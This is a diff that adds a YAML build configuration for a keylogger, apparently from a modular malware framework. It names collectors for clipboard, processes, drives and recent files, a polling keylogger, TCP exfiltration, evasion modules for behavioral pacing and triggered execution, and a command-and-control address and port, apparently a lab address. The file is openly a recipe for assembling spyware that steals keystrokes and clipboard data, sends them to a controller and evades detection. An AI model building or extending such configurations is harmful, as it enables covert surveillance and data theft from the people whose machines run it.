@@ -1,0 +1,25 @@
+name: keylogger_certutil
+description: Keylogger with direct TCP exfil — extended recon (drives, recent files)
+
+core:
+  - core/emit_buffer
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+  - collectors/drives
+  - collectors/recent_files
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/triggered_exec
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
